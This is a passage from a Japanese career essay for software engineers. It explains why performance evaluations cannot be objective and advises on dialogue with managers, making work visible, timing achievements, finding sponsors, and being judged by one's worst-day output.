それが「頑張り方」です。構造を知れここで公平を期しておきます。仕組みの問題は確かにあります。OKRの目標設定が形骸化している。評価者によって評価がブレる。数値化できない仕事が過小評価される。これは仕組みを運営する上で抱える問題です。「人は他人を正しく評価できる」——これは幻想です。同じ人の同じ仕事を見ても、評価者が違えば評価は違います。同じアウトプットで、上司が変わっただけで評価が2段階変わることもあります。私です。絶対的に客観的な評価など存在しません。そもそも、数値で測ろうとした瞬間、測定対象は変質します。コミット数を測り始めたチームを見たことがあります。結果、コミットが細切れになりました。バグ修正件数を測れば、バグを作った人が有利になります。プルリクエストの数を測れば、小さなPRを乱発する人が評価されます。グッドハートの法則と呼ばれる現象です。「指標が目標になると、その指標は機能しなくなる」。OKRを導入したとき、私はこの法則を知りませんでした。知っていたら何か変わったかと言われると、たぶん変わりませんでした。人間だから。エンジニアリングの現場では、これが顕著に現れます。これは事実です。認めましょう。その上で、自分に何ができるかを考えます。仕組みの問題を批判するのは簡単です。でも、評価制度を変えるのは難しい。上司を変えることはできません。待っていても変わりません。冒頭で書いた通り、私はこれをやっていました。仕組みの問題を指摘して溜飲を下げる。鎮痛剤を飲み続けて、原因を放置していました。仕組みがおかしいのは事実です。でも、仕組みは変えられない。自分は変えられる。 それが「頑張る」ということです。変えられないものに時間を使うほど、あなたの人生は長くありません。——と書いて、立ち止まります。「結局、自己責任論じゃないか」と言われるだろう。構造の問題を認識しながら、最後に「個人が変われ」と言っている。評価されないのは構造の問題なのに、「お前の頑張り方が悪い」と言っている。それは自己責任論の強化じゃないか、と。正直に言えば、その批判は当たっています。私は構造の問題を認識しながら、「構造を変えろ」とは言いませんでした。「構造の中でうまくやれ」と言いました。それは、構造を温存することに加担しています。これは私の限界です。私が書けるのは、私が経験したことだけです。構造を変えることに成功した人が、その方法を書いてくれることを願います。ただ、1つだけ言い訳させてください。私は「評価されないのはお前のせいだ」とは言っていません。「評価制度には限界がある」「客観的評価は存在しない」と、繰り返し書きます。その上で、「構造が変わらない中で、個人に何ができるか」を書いています。自己責任論と言われれば、そうだろう。でも、構造が変わるのを待っていても、あなたの評価は上がりません。変わらない構造の中で、今日をどう生きるか。それを考えるしかありませんでした。しかし、重要な注意点があります。仕組みの問題が大きすぎる時は、「辞める」が正解のことがあります。 個人の努力で覆せない構造もあります。それを見極める目も必要です。評価制度が必ず歪む理由評価制度が歪むのは、設計者の能力不足ではありません。測定されるものは、測定によって変質するからです。どの制度も、導入した瞬間に歪み始めます。完璧な評価制度は原理的に存在しません。この事実は、あなたを責めるためにあるのではありません。あなたを解放するためにあります。「自分が無能だから評価されない」という思い込みから解放され、「制度の限界を前提に、どう動くか」という問いに切り替わります。評価の幻想上司は、神でもエスパーでも上位存在でもありません。人間です。君よりも少しだけ観点の多い人間です。人外だと思っている上司も、人間であり、認知には限界があります。これは「上司が無能だ」という話ではありません。人間である限り、客観的評価は原理的に不可能だという話です。なぜ「客観的評価」は不可能なのか「客観的評価」という言葉には、2つの前提があります。「評価すべき対象を正確に観察できる」という前提と、「観察したものを正確に評価できる」という前提です。どちらも成り立ちません。観察の問題から見てみましょう。上司があなたの仕事のうち、何%を直接観察しているでしょうか。会議での発言。Slackでのやり取り。プルリクエスト。これは観察できます。でも、設計を考えている時間。問題を切り分けている時間。ドキュメントを読んでいる時間。これは見えません。上司が見ているのは、あなたの仕事の氷山の一角に過ぎません。観察できるものだけを見て、全体を評価している。これは観察者の怠慢ではありません。構造的に避けられない限界です。比較の問題もあります。評価とは、本質的に比較です。Aさんは「期待以上」、Bさんは「期待通り」。この判断をするには、AさんとBさんを比較する必要があります。でも、2人の仕事が違えば、比較は困難になります。バックエンドで高負荷対策をしたAさんと、フロントエンドで複雑なUIを実装したBさん。どちらが「より価値がある」か。答えはありません。比較不可能なものを比較しています。上司は無理やり比較し、順位をつけます。その順位に「客観性」などありません。観察者効果という問題もあります。観察すること自体が観察対象に影響を与えるというものです。「評価される」と意識した瞬間、行動が変わります。評価されやすい仕事を選ぶ。見える形で成果を出そうとする。「本当の仕事ぶり」を観察しているわけではありません。「評価を意識した仕事ぶり」を観察しています。上司の認知バイアス観察の限界に加えて、観察したものを処理する段階でもバイアスがかかります。直近バイアス: 1年間を均等に覚えていません。評価直前の出来事が記憶に残ります。4月に素晴らしい仕事をしても、12月の評価面談では薄れています。11月に目立つ失敗をすると、それが印象を決めます。ハロー効果: 1つの良い印象が全体評価を引き上げます。1つの失敗が全体を引き下げます。障害対応で活躍すると、「この人は優秀だ」と思われます。その印象が、関係のない能力の評価にも影響します。確証バイアス: 一度「優秀」と思うと優秀な証拠ばかり目に入ります。「ダメ」も同様です。最初の印象が固定され、それを覆す情報は無視されます。これは上司の能力不足ではありません。人間の認知システムに組み込まれた特性です。どんなに優秀な上司でも、これらのバイアスから完全に逃れることはできません。ここで、1つ確認しておきたいです。「自分は正しく評価されていない」と感じたことがあるでしょうか。もしあるなら、それは被害妄想ではありません。構造的に、完全に正しい評価など存在しません。上司がどんなに優秀でも、認知バイアスからは逃れられません。あなたの感覚は、間違っていません。評価基準自体が「客観的」ではないより根本的な問題があります。評価基準自体が客観的ではないのです。「技術力」「コミュニケーション力」「リーダーシップ」——評価シートに並ぶこれらの言葉は、一見客観的に見えます。でも、その定義は人によって違います。「技術力が高い」とは何か。コードの品質が高いこと？難しい問題を解決できること？新しい技術をキャッチアップするのが速いこと？幅広い技術に詳しいこと？上司によって、重視する側面が違います。つまり、評価基準そのものが社会的に構成されたものです。「何を価値とするか」は、文化、組織、時代によって変わります。普遍的な基準などありません。私は異動で気づきました。前のチームでは「期待以上」と評価されていました。技術的な深さを評価してくれる上司でした。異動した先では「成長途上」と評価されました。新しい上司はチームへの影響力を重視していました。スキルは変わっていません。変わったのは上司です。「客観的評価」を求めるより、やるべきこと評価とは「私が何をしたか」ではなく「上司が私をどう見るか」です。この事実を受け入れると、行動が変わります。「客観的に見れば、私は評価されるべきだ」という主張は意味がありません。客観的な視点など存在しないからです。存在するのは、上司の視点だけです。だから、「客観的評価」を求めるのはやめました。代わりに、上司が何を見ているかを理解することに注力しました。上司は何を重視するか。何に反応するか。何を見落としているか。それを理解した上で、上司に伝わる形で成果を見せます。これは媚びを売ることとは違います。上司の視界に入る努力をしているだけです。上司の視点を理解するには、いくつかの問いを考えるといいです。「この上司は何を『良い仕事』だと思っているか」「この上司は何にストレスを感じているか」「この上司は、上からどんなプレッシャーを受けているか」。これらを理解すると、上司が何を見て、何を見落としているかが見えてきます。組織の論理評価制度と評価者の心理を理解したら、次は組織の論理を理解しましょう。組織には、個人の論理とは異なる、独自の論理があります。この論理を理解しないと、「なぜ評価されないのか」が分からないままになります。組織は「最適化」で動く組織は、個人の幸福を最大化するために存在しているわけではありません。組織の存続と成長を最適化するために存在しています。この当たり前の事実を、意外と多くの人が忘れています。評価制度も、昇進制度も、給与制度も、すべて「組織の最適化」のために設計されています。「個人が納得するか」は、二次的な目標に過ぎません。もちろん、個人が納得しなければ離職が増えるから、ある程度は配慮されます。でも、最優先ではありません。だから、「公平な評価」を期待すると、裏切られます。組織が目指しているのは公平な評価ではなく、組織にとって都合の良い行動を引き出す評価だからです。昇進はゼロサムゲームである昇進枠は有限です。誰かが昇進すれば、誰かは昇進しません。「今期は枠がなかった」と言われたことがある人もいるでしょう。それは、あなたの実力の問題ではなく、構造の問題です。予算も同じです。パイの大きさは決まっています。問題は、パイをどう切り分けるかです。だから、昇給交渉は「自分の価値を証明する」だけでは不十分です。「なぜ自分に配分を増やすべきか」を説明する必要があります。自分に正直に向き合ってください。あなたが昇進することで、上司やチームにはどんな具体的なメリットがあるか。「この人を昇進させると、〇〇という効果があります」と言える材料を、あなた自身が上司に渡してください。政治は「資源配分の闘争」である「誰を昇進させるか」は、技術力だけで決まりません。上司と上司の上司の関係。部門間の力学。人事部の意向。様々な要素が絡み合います。「政治なんて関係ない」と思いたい気持ちは分かります。技術力で勝負したい。でも、組織で働く以上、政治は存在します。政治とは何か。限られた資源を巡る配分の闘争です。資源とは、予算、人員、プロジェクト、昇進枠、注目、発言力。これは有限です。誰かが得れば、誰かが失います。この配分を決めるプロセスが、政治です。政治を「汚いもの」と見なすのは、的外れです。資源が有限である限り、配分のプロセスは必ず存在します。それを「政治」と呼ぼうが呼ぶまいが、現象は消えません。政治を無視しても、政治はあなたに影響します。あなたが政治を無視しても、他の誰かが政治を使って資源を獲得すれば、あなたに回る資源は減ります。だから、政治を理解した上で動いた方がいいです。しかし、誤解しないでください。「政治を理解してください」は「政治に加担してください」という意味ではありません。「政治ゲームの名プレイヤーになってください」とも言っていません。政治の存在を認識し、その中で自分がどう動くかを考えるということです。組織の論理と個人の論理は違うここまでの話をまとめると、こうなります。組織は「組織の最適化」で動きます。個人の最適化ではありません昇進枠は有限です。ゼロサムゲームです予算は配分の問題です。パイの切り分けです政治は資源配分の闘争です。避けられませんこれらを理解すると、「なぜ評価されないのか」の見え方が変わります。「自分は良い仕事をしている」は、個人の論理です。組織の論理から見ると、「良い仕事をしている人」は他にもいます。問題は、有限の資源を誰に配分するかです。だから、「良い仕事をすれば評価される」は半分しか正しくありません。正確には、「良い仕事をした上で、資源を配分すべき理由を説明できれば評価される」です。ここまで読んで、息苦しくなっただろう。評価制度には限界があります。客観的評価は存在しません。組織は個人の幸福を最大化しません。昇進はゼロサムゲームです。政治は避けられません。厳しい現実です。でも、現実を知ることは、現実に絶望することではありません。構造を知らなければ、暗闘の中で闘っているようなものです。構造を知れば、どこに光があるか見えます。ここからは、その光に向かって動く方法を書きます。やるべきことは、大きく3つあります。「どこを見るか」を変えること、「対話」を通じて認識を揃えること、「見せる」ことで存在を証明することです。チームを見ろ組織の論理を理解したら、次は「どこを見るか」を変えることです。「どの会社で働くか」が大事だと思われています。でも、本当に大事なのは「どのチームで働くか」です。従業員が「ここで働くのをやめよう」と決める時、この「ここ」は会社ではありません。チームです。会社は好きだがチームが合わなくて異動する人がいます。逆に、会社の方針には疑問があるがチームが良くて残る人もいます。これは新卒就職活動をされている方や、転職を考えている方に特に知っておいてもらいたいことです。企業文化が良い会社でも、自分が配属されるチームの雰囲気が良いとは限りません。評価も同じです。「この会社の評価制度」より、「直属の上司の評価パターン」の方が、あなたの評価に直接影響します。会社の評価制度がどれだけ整っていても、その制度を運用するのは上司です。上司が制度を正しく運用しなければ、制度の意味はありません。逆も同じです。評価制度が多少おかしくても、上司が良ければ、適切に評価される可能性があります。だから、転職先を選ぶときも、残るか辞めるかを判断するときも、「会社」という抽象的な単位で考えないでください。どのチームに入るか。誰が上司になるか。 その具体的な単位で考えてください。対話しろ嘆きは鎮痛剤だと書きました。では、対話は何か。対話は手術です。痛いし、面倒だし、時間がかかります。でも、原因を取り除ける可能性があります。対話が必要な理由は単純です。あなたと上司は、別の人間だからです。別の経験を持ち、別の価値観を持ち、別の情報を持っています。この情報の非対称性を埋める方法は、対話しかありません。見えている世界の違いを理解する上司と話が通じないとき、「上司が悪い」と思いがちです。でも違います。部下と上司では見えている世界が違います。自分から見ると理不尽な判断でも、上司の立場から見ると合理的なことがあります。上司には上司のプレッシャーがあります。部門の目標があります。上からの期待があります。その世界の中で、上司は合理的に動いています。その上で話せないことがあります。これは「上司の判断を正当化してください」という話ではありません。上司の判断が間違っていることもあります。でも、その判断がどこから来ているかを理解しなければ、対話はできません。対話とは、この世界の違いを認識した上で、共通の理解を構築する作業です。自分の世界だけで考えると「なんで分かってくれないんだ」となります。でも、上司の世界に立ってみると「なるほど、だからそう判断するのか」と見えてきます。見えてくれば、「では、この点はどうですか」と別の角度から提案できます。上からの視点と現場の視点上司と部下では、見ている方向が違います。上司は上から降りてくる方針を見ています。目標、KPI、ロードマップ。経営が何を求めているか。一方、現場は下を見ています。実際に何が起きているか。どこに問題があるか。この2つが噛み合っていないと、話が通じません。「上が何を考えているか分からない」「現場の声が届かない」——どちらも、この断絶の症状です。対話は、この2つをつなぐ作業です。上司と話すとき、上司が見ている方向を理解しようとします。同時に、現場のリアリティを言語化して伝えます。その接点を見つけることが、対話の目的です。ここで具体的なアクションがあります。上司が今、上の階層から課されている「最も頭の痛い課題」を把握してください。上司も誰かの部下です。上司にも上司がいます。その上司から何を求められているか。何に頭を抱えているか。それを知れば、あなたの仕事をどう位置づければいいか見えてきます。上司が「コスト削減」に追い詰められているなら、あなたの技術改善は「効率化」として語ってください。上司が「新規プロジェクトの立ち上げ」に追われているなら、あなたの貢献は「立ち上げを支える基盤整備」として語ってください。上司の頭痛の種を知れば、あなたの仕事の見せ方が変わります。対話を自分から始める「次の昇進に必要なことは何ですか」と1on1で聞きます。怖いです。否定されるでしょう。「まだ早い」と言われるでしょう。でも、聞かないと何も始まりません。自己評価と組織からの評価が食い違うとき、上司を敵だと思ってしまいがちです。「この人とは話しても仕方ない」と見限って、対話をやめます。これが最悪のパターンです。一度「敵」だと思うと、何を見ても敵の証拠に見えます。中立的な発言も「やっぱり敵だ」と解釈します。相手もそれを感じ取り、本当に敵対してきます。悪循環にハマります。これは認知バイアスの一種で、一度形成された敵対的な認知は、自己強化していきます。対話を自分から始めてください。待っていても始まりません。対話は「同意」ではない対話の目的は、合意することではありません。理解を共有することです。対話した結果、意見が一致しないこともあります。それでいいです。重要なのは、「なぜ相手がそう考えるか」を理解することです。理解した上で、なお意見が違うなら、それは対話の失敗ではありません。「上司と対話したが、評価は変わらなかった」という結果があり得ます。それでも、対話には意味があります。「なぜ評価が変わらないのか」の理由を理解できたはずです。理由を理解すれば、次の行動を決められます。理由が「あなたのスキルが足りない」なら、スキルを伸ばす努力をします。理由が「今期は枠がない」なら、来期に向けて準備します。理由が「この上司とは価値観が合わない」なら、異動や転職を検討します。対話の目的は、情報を得ることです。同意を得ることではありません。制度が機能していないなら、自分で対話を作れ本当は、目標設定や評価制度というのは、この対話を縮減化して仕組み化したものです。「何を目指すか」「どこまでやるか」「何ができたか」を定期的にすり合わせる機会です。でも、多くの組織で、この仕組みは形骸化しています。目標設定は形だけです。評価面談は結果の通知だけです。対話が発生していません。仕組みがうまく機能していないなら、仕組みが本来やろうとしていたことを、自分で意識的にやればいいです。1on1で自分から聞きます。週次報告で自分から伝えます。仕組みに頼らず、対話を自分で作ります。基準を握れ構造を理解し、対話の重要性を理解したら、次は具体的に動きます。まず、評価基準を言語化してください。多くの人は、上司が何を基準に評価しているか、明確に理解していません。なんとなく「良い仕事をすれば評価される」と思っています。でも、上司の頭の中にある評価基準と、自分が想像している評価基準は、往々にしてズレています。1on1で聞くべき具体的な質問「昇進に必要なことは何ですか」「今の自分に足りないものは何ですか」「次の評価期間で何を達成すれば、評価が上がりますか」「あなたが重視していることは何ですか」「なぜその目標が重要なんですか」「この目標が達成されないと、何が困りますか」これらの質問を、恐れずに聞いてください。「そんなこと聞いていいの？」と思うでしょう。私もそう思っていました。こういう質問をすることに、強い抵抗がありました。正直に言えば、私を含めてエンジニアは、こういう「合意形成」をバカにしている節があります。技術力で勝負したい。政治的なことはやりたくない。上司にゴマをするみたいで嫌だ。そういう感覚があります。もう1つ、ネガティブなフィードバックを受け取りたくない、という心理もあります。「今の自分に足りないものは何ですか」と聞いて、厳しいことを言われたらどうしよう。自分が思っているより評価が低かったらどうしよう。聞かなければ、知らずに済みます。でも、聞かなければ分かりません。上司はエスパーではないし、あなたもエスパーではありません。期待値をすり合わせるには、対話するしかありません。「昇進したいです」と直接言うのは恥ずかしいです。自分の欲を見せることに抵抗があります。私は3年間言えませんでした。言い出せないまま、居酒屋で愚痴を言い、鎮痛剤を飲み続けていました。鎮痛剤の効き目が切れてきた4年目に、ようやく口を開きました。でも、上司からすれば、部下が何を求めているか分からなければ、サポートのしようがありません。期待値のすり合わせ上司が求めるものと、自分がやりたいことは、必ずしも一致しません。上司が重視するのはAだが、自分が得意なのはB。この場合、どう動くか。まず、そのギャップを言語化してください。「自分はBが得意だが、Aに注力すべきですか」と聞いてください。上司は「Aをやってほしい」と言うでしょうし、「Bで成果を出してくれればいい」と言うでしょう。どちらにせよ、ギャップを認識した上で動けます。ギャップを認識しないまま、自分の得意なBに注力して、評価面談で「Aをやってほしかったのに」と言われるのが最悪のパターンです。見せろ評価基準を理解しました。上司との期待値もすり合わせました。次は、実際に動く番です。対話は手術だと書きました。では、見せることは何か。見せることはリハビリです。地味で、継続が必要で、効果が見えるまで時間がかかります。でも、これをやらなければ、手術しても回復しません。冒頭で書きました。見えない仕事は、存在しないのと同じだと。障害を未然に防いでも、誰も気づきません。技術的負債を返済しても、「いつの間にかキレイになってた」で終わります。これは不公平です。でも、嘆いても変わりません。変えられるのは、自分の行動だけです。だから、見せてください。何をやっているか、どんな価値を生んでいるか、言葉にして伝えてください。なぜ「見せる」ことが必要なのか「良い仕事をしていれば、見てもらえるはずだ」——これは幻想です。上司の注意は有限です。注意は希少資源です。上司は複数の部下を持っています。自分の仕事もあります。上からのプレッシャーもあります。その中で、あなたの仕事に割ける注意は、ごくわずかです。あなたが黙って良い仕事をしていても、上司の注意はあなたに向きません。問題を起こす部下、声の大きい部下、頻繁に報告してくる部下に注意が向きます。注意を向けてもらえなければ、あなたの仕事は認識されません。認識されなければ、評価されません。これは「目立ったもの勝ち」という話ではありません。情報の非対称性の話です。あなたは自分の仕事を100%知っています。上司は、あなたの仕事の10%も見ていません。この情報ギャップを埋めるのは、あなたの責任です。上司が勝手に気づいてくれることを期待するのは、非現実的です。人が本当に求めているのは、実はフィードバックではありません。「注目」です。自分の仕事を見てもらっている。気にかけてもらっている。存在を認識されている。そういう感覚です。私自身、厳しいフィードバックより、上司が自分の仕事を把握していないことの方が堪えました。評価されないと感じるとき、本当の問題は「評価が低い」ことではなく「注目されていない」ことでしょう。上司は、あなたが何をしているか知りません。知らなければ、評価以前の問題です。「見せる」ことへの抵抗多くのエンジニアは、「見せる」ことに抵抗がある。「アピールは卑しい」という感覚がある。日本の文化では、自己主張は美徳ではない。「黙って結果を出す」が美しいとされる。自分の成果を語ることは、自慢に見える。謙虚さが失われる。そういう感覚がある。でも、この感覚は、情報の非対称性を無視している。あなたが黙っていれば、上司はあなたの仕事を知らない。知らなければ、評価できない。「黙って結果を出す」は、「結果を出しても評価されない」と同義だ。「仕事の質で勝負したい」という信念もある。アピールの上手さではなく、仕事の質で評価されたい。それは正しい感覚だ。でも、仕事の質を上司に伝えるのは、アピールではない。情報提供だ。上司は、あなたの仕事の質を判断する材料を持っていない。その材料を提供するのは、あなたの役目だ。具体的な言い方週次報告での言い方ダメな例:「今週はAの修正をしました。」良い例:「今週はAの修正をしました。このバグは再現条件が複雑で、ログから特定するのに2日かかりました。原因は○○で、同様の問題が他に3箇所あったので併せて修正しています。」違いは、「何が難しかったか」「どう判断したか」「影響範囲をどう考えたか」を言語化していること。Slack、1on1、どの場面でも同じ原則です。言語化はスキルだアピールが苦手？ なら、存在しないのと同じだ。「自慢みたいで嫌だ」と思うだろう。私もそうだった。でも、これは自慢ではない。自分の仕事の価値を言語化しているだけだ。言語化しなければ、他人には見えない。見えなければ、評価されない。言語化は、スキルだ。最初は苦手でも、練習すれば上達する。週次報告を書くたびに、「何が難しかったか」を1文追加する。それだけで、見え方が変わる。タイミングを狙え「見せる」にも戦略がある。上司の認知の限界を理解することが重要だ。なぜタイミングが重要なのか評価面談の席で、上司は1年間を振り返る。でも、1年間を均等に思い出すことは、人間には無理だ。上司も人間だ。人間の記憶には癖がある。最初の方と最後の方は覚えているが、中間は忘れやすい。期初に立てた目標は覚えている。期末の追い込みも覚えている。でも、中間の地道な仕事は埋もれる。より厄介なのが、最近の出来事ほど重要に感じられる傾向だ。4月に素晴らしい仕事をしても、12月の評価面談では遠い記憶だ。「そういえば、何かやってくれた気がするな」程度の印象しか残らない。一方、11月に目立つ成果を出せば、12月の評価面談では鮮明に覚えている。もう1つ、人間は経験全体を平均的に評価しない。最も印象的だった瞬間と、終わりの印象で全体を判断する。1年間コツコツ働いても、期末に目立つ成果がなければ、「今期は普通だったな」という印象になりやすい。逆に、期末に大きな成果を出せば、「今期は頑張っていたな」という印象が残る。これは上司の能力不足ではない。人間の脳の仕組みだ。批判しても変わらない。構造を理解した上での3つの戦略この認知の限界を理解した上で、どう動くか。1. 評価の2ヶ月前に目立つ成果を出す大きなリリースのタイミングを調整可能なら、評価期間の後半に持ってくる。調整できなくても、過去の成果の効果を後半に言語化し直すことはできる。「4月にリリースした機能が、この半年でこれだけの効果を出しました」と。成果を「過去のイベント」ではなく「現在も続いている効果」として再提示する。2. 月次で「今月やったこと」を共有する上司の記憶を定期的に上書きする。年末に慌てて振り返るのではなく、毎月、記録を残しておく。これは上司のためだけではない。自分のためでもある。1年前に何をやったか、自分でも忘れる。月次の記録があれば、評価面談の準備が楽になる。もう1つ重要なことがある。「ピーク」がない期間の地味な貢献を、上司が「思い出しやすいエピソード」として毎月ストックしているか。「今月は特に目立った成果はありませんでした」で終わらせるな。地味な仕事でも、言語化すれば印象に残る。「依存ライブラリのアップデートで、セキュリティリスクを2件潰しました」。これだけで、「あの人は地道にやってくれている」という印象が積み上がる。3. 印象に残る瞬間を意識的に作る人間は、最も印象的だった瞬間で全体を判断する。これを逆手に取る。難しい問題を解決した。障害対応で活躍した。これらの「ピーク」は記憶に残りやすい。ピークがあれば、平凡な日々も「あの人は活躍していた」という印象に変換される。「ズルい」という感覚について「タイミングを調整するなんてズルい」と思うでしょう。仕事の質で評価されるべきです。タイミングを操作するのは、本質的ではありません。でも、考えてみてほしい。あなたがタイミングを意識しなくても、他の誰かは意識しています。評価期間の後半に目立つ成果を出す人。月次報告を欠かさない人。彼らは「ズルい」のではなく、「構造を理解している」だけです。タイミングを調整することは、媚びを売ることではありません。上司の認知の限界を理解した上で、情報を届けているだけです。上司が全てを均等に覚えていてくれるなら、タイミングは関係ありません。でも、上司は人間です。人間の記憶には限界があります。その限界を前提として動く方が、合理的です。この癖は、知っていれば対処できます。知らなければ、無意識のうちに損をします。評価する側もされる側も、同じ脳を持っています。上司もまた、自分の記憶の癖に気づいていないことが多いです。4. 失敗したときのリカバリーを設計しておく失敗は起きます。問題は、その失敗がハロー効果で全体評価を引きずり下ろすことです。「あの人は失敗した」という印象が、関係のない能力の評価まで下げます。これを防ぐには、失敗の直後に2つのことをやってください。まず、迅速に報告してください。隠そうとして発覚すると、「失敗した」にまた「隠そうとした」が上乗せされます。次に、原因と対策を透明に説明してください。「なぜ起きたか」「何を学んだか」「次にどう防ぐか」を言語化します。これができると、「失敗した人」ではなく「失敗から学べる人」という印象に変換されます。失敗を完全に消すことはできません。ですが、失敗の印象を上書きすることはできます。スポンサーを作れ昇進には「スポンサー」と「可視化」が必要だ。なぜスポンサーが必要なのか昇進は、だいたいあなたの知らないところで決まる。評価会議というものがある。マネージャーが集まって、誰を昇進させるか、誰に良い評価をつけるかを議論する。あなたは、その会議に出席できない。出席できないのに、そこであなたの運命が決まる。あなたの仕事ぶりを知っている人が、その会議にいなければ、あなたの名前は挙がらない。名前が挙がらなければ、昇進しない。どんなに良い仕事をしていても、その会議で誰かがあなたの名前を出さなければ、無意味だ。その「誰か」が、スポンサーだ。スポンサーとメンターの違いメンターは、アドバイスをくれる人だ。キャリアの相談に乗ってくれる。「こうした方がいいよ」「あの人に話を聞いてみたら」と教えてくれる。スポンサーは、あなたの成果を上に伝えてくれる人だ。人事評価の場で、あなたの名前を出してくれる。「あいつは良い仕事をしている」と会議で言ってくれる。この違いは決定的だ。メンターは「あなたのために」アドバイスをくれる。でも、スポンサーは「あなたのために」リスクを取る。評価会議であなたの名前を出すということは、スポンサー自身の信用を賭けることだ。「私が推薦した人」が期待外れだったら、スポンサーの評価が下がる。だから、スポンサーになってもらうのは、メンターになってもらうより難しい。メンターがいても、スポンサーがいなければ、昇進の話にはならない。あなたの良い仕事を知っている人がいても、その人が上に伝えてくれなければ、上層部はあなたを知らない。上司だけがスポンサーではない多くの場合、直属の上司が最初のスポンサー候補になる。でも、上司だけに依存するのはリスクがある。上司が異動することがある。上司が退職することがある。上司との相性が悪いこともある。上司が評価会議で発言力を持っていないこともある。上司一人に依存していると、その上司がいなくなった瞬間、あなたを推してくれる人がゼロになる。だから、上司以外のスポンサーも獲得しろ。評価会議には、複数のマネージャーが参加する。あなたの上司だけでなく、他のチームのマネージャーも発言権を持っている。もし、あなたの名前が複数の人から挙がったらどうなるか。「〇〇さん、評判いいね」となる。一人が推すより、複数が推す方が説得力がある。上司以外のスポンサー候補は、意外と身近にいます。他チームのマネージャー: 横断プロジェクトで一緒に働いた人技術リード: マネージャーに意見を求められる立場の人越境した仕事を意図的に作ってください。横断プロジェクトに手を挙げます。他チームのコードレビューを引き受けます。上司を勝たせることの意味上司が成果を出せば、チーム全体の評価が上がります。リソースが配分されます。自分の評価も上がりやすくなります。「媚びる」と「伝える」は違います。情報の非対称性を埋めているだけです。条件が揃わない場合しかし、これには条件がある。条件1: 上司が「勝とうとしている」こと上司が何を達成しようとしているかを理解できないなら、この戦略は機能しない。目標が不明確な上司、日々の消化試合に終始している上司には、「勝たせる」も何もない。判断方法：1on1で「今期の最優先目標は何ですか」と聞く。具体的な目標を即答できるなら、勝とうとしている。「色々ある」「維持が目標」と言うなら、勝とうとしていない可能性が高い。条件2: 上司が「部下の貢献を認識できる」こと上司を勝たせても、「これは俺の成果だ」と言い張る上司がいる。この場合、どれだけ貢献しても報われない。判断方法：過去の昇進者を観察する。上司が「〇〇さんのおかげで成功した」と言っていたか。チームの成果発表で、メンバーの名前を出していたか。自分の手柄にする上司は、パターンがある。条件3: 組織が「チームの成功を個人にも還元する」構造であることチームが勝っても、個人の評価に反映されない組織がある。年功序列が強すぎる、政治が評価を決める。この場合、上司を勝たせても自分には返ってこない。判断方法：先輩に聞く。「チームが成果を出したとき、個人の評価に反映されましたか」と。曖昧な答えが返ってきたら、還元されていない証拠だ。これらの条件が揃わない場合、「上司を勝たせる」戦略は機能しない。別の手を考える必要がある。例えば、「異動する」「別のスポンサーを見つける」「辞める」だ。上司以外のスポンサーを持っていれば、この「別のスポンサーを見つける」がすでに準備できている。上司に依存しすぎないためにも、日頃から複数のスポンサー候補との関係を築いておくことが重要だ。下振れで測られる対話しても評価が変わらないことがある。そのとき、もう1つ確認すべきことがある。自己認識と他者認識のギャップだ。「最高の自分」は実力ではない多くの人は、「最高の自分」を自分の実力だと思っている。ゾーンに入って神がかった速度でコードを書く自分。難解なバグを一瞬で特定する自分。そういう「最高の瞬間」を「自分の実力」だと信じる。でも、上司が見ているのは別のものだ。上司は、あなたに仕事を任せるとき、こう考える。「この人に任せて、最悪どうなるか」と。最高のケースではない。最悪のケースだ。なぜなら、任せた仕事が期待以下だったとき、責任を取るのは上司だからだ。上司は自分の評価を賭けている。だから、リスクを最小化したい。つまり、あなたは「上振れ」ではなく「下振れ」で判断されている。調子が良い日に出した成果は、「たまたま」でしょう。調子が悪い日に出した成果こそ、「確実に期待できるライン」です。上司が知りたいのは、後者です。だから、自分の実力を測るなら、最高の日ではなく、最悪の日を見てください。何もやる気が起きず、頭も回らず、ただ惰性でキーボードを叩いている日。その日に絞り出したアウトプット。それが、他人から見た「あなたの実力」に近いです。安定性という信頼信頼は、瞬間最大風速では測られない。安定性で測られる。毎週コンスタントに成果を出す人と、たまに爆発的な成果を出すが波がある人。どちらが信頼されるか。前者だ。爆発的な成果は印象に残る。でも、任せる側からすれば、「今回はどっちだろう」と毎回賭けをすることになる。安定している人には、安心して任せられる。ここで、あまり語られない現実を書く。体調管理は、評価に直結する。「体調不良は仕方ない」と、口では誰もがそう言う。風邪をひいた、熱が出た、それは本人のせいではない。責めるべきではない。正論だ。でも、現実はそんなに甘くない。風邪で3日寝込めば、1週間分の生産性が消える。体調不良の翌週もパフォーマンスは戻りきらない。締め切り直前に体調を崩せば、チーム全体に影響が出る。上司は、それを見ている。口では「お大事に」と言う。でも、心の中では「また休みか」と思っている。重要なプロジェクトを任せるとき、「この人、大丈夫かな」と不安がよぎる。結果、重要な仕事は「安定して稼働できる人」に回る。これは不公平だと思うだろう。体質の問題もある。本人の努力だけではどうにもならないこともある。それは事実だ。でも、コントロールできる部分は、コントロールしてください。もう1つ重要なことがあります。自分のパフォーマンスが落ちる兆候を自己認識していますか。睡眠不足が続くとどうなるか。ストレスが溜まるとどうなるか。これらを把握しておけば、周囲に「予測可能性」を提供できます。「来週は締め切りが重なっているので、レスポンスが遅くなるだろう」と先に言っておきます。これは弱みを見せることではありません。プロとして自分の状態を管理していることを示しています。上司があなたに仕事を任せるとき、「リスク」として感じている要素は何か。「この人は締め切りを守らない」と思われているなら、小さな約束から確実に守ってください。上司の中にある「リスク認知」を、1つずつ消していってください。他人はあなたの「見えた成果の平均」を見ている自分で認識している自分と、他人が見ている自分は違います。あなたは自分の内面を知っています。「今日は調子が悪い」「昨日は睡眠不足だった」「あのときは本気を出していなかった」。そういう文脈を全て知っています。だから、最高のパフォーマンスを出した日を「本当の自分」だと思います。それ以外の日は、何か理由があってパフォーマンスが落ちた「例外」だと思います。他人は、あなたの内面を知りません。見えるのは、あなたのアウトプットだけです。見えたアウトプットの平均が、「あなた」として認識されます。見せなかった仕事は、平均にすら入りません。最高の日も、最悪の日も、見えた範囲で平均化されます。だから、あなたが「本気を出せばもっとできる」と思っていても、他人から見れば「見えた範囲のあなた」がそのままあなたの実力です。見せていない実力は、存在しないのと同じです。ギャップを埋める方法自己認識と他者認識のギャップを埋めるには、フィードバックを求めるしかない。「私の強みと弱みは何ですか」と上司に聞く。怖い。自分が思っている自分と違う答えが返ってくるだろう。でも、聞かなければギャップは分からない。もう1つの方法は、360度評価の結果を真剣に受け止めることだ。多くの人は、360度評価の結果を「まあ、そういう見方もあるよね」程度で流す。でも、複数の人が同じことを指摘しているなら、それはおそらく事実だ。「本当はもっとできる」は通用しない新しい環境で、あなたは「最高の自分」ではなく「最悪の自分」で評価される。慣れない環境、知らないコー